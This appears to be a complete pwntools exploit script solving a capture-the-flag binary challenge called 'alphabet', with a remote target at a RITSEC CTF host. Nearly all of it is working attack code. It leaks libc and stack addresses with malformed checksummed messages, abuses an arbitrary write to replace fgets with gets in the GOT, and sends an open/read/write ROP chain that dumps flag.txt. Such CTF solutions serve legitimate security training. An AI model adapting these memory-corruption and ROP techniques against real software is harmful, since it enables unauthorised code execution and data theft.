#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("alphabet.bin_patched")
libc = ELF("./libc.so.6")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

host, port = "alphabet.challenges.ctf.ritsec.club", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def checksum(data):
  sum = 0
  for c in data:
    sum += ord(c) ^ 0x55
    sum &= 0xff
  return sum

def write(dst, src):
  global stack
  payload = b'Z'+p8(8)+p64(0x10000000000000000-((stack-src)+18))+p64(0x10000000000000000-((stack-dst)+18))+p64(0xdeadbeef)
  payload += p8(checksum(payload))
  sla('threads\n', payload)

def writeval(dst, val):
  temp = 0x404800
  pos = 0
  for c in val:
    addr = next(libc.search(c))
    write(temp+pos, addr)
    pos += 1
  write(dst, temp)

payload = b'Z'+p8(8)+p64(0x10000000000000000-((29*8)+18))+p64(0)
payload += p8(checksum(payload))
sla('threads\n', payload)
libc.address = u64(rcu('characters: ', '\n').ljust(8,b'\x00'))-0x8cf43
logbase()

payload = b'Z'+p8(8)+p64(0x10000000000000000-((2*8)+18))+p64(0)
payload += p8(checksum(payload))
sla('threads\n', payload)
stack = u64(rcu('characters: ', '\n').ljust(8,b'\x00'))
logleak('stack', stack)

writeval(exe.got['fgets'], p64(libc.sym['gets']))

rop = ROP(libc)
# gadgets
syscall = libc.address+0x0000000000091396 # syscall; ret;
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = libc.address+0x000000000011f497 # pop rdx ; pop r12 ; ret
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
# open/read/write ROP
payload2= b'A'*0x30
payload2 += b'flag.txt\x00'.ljust(0x18,b'\x00')
payload2 += p64(pop_rdi)+p64(stack+0x30)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
payload2 += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404900)+p64(pop_rdx)+p64(0x100)*2+p64(pop_rax)+p64(0)+p64(syscall)
payload2 += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x404900)+p64(pop_rdx)+p64(0x100)*2+p64(pop_rax)+p64(1)+p64(syscall)

p.sendline(payload2)

gadget = libc.address+0x0000000000114efc # add rsp, 0x68 ; ret
if args.GDB:
  print('put breakpoint here gadget='+hex(gadget))
  pause()
writeval(stack-0x28, p64(gadget))
p.interactive()

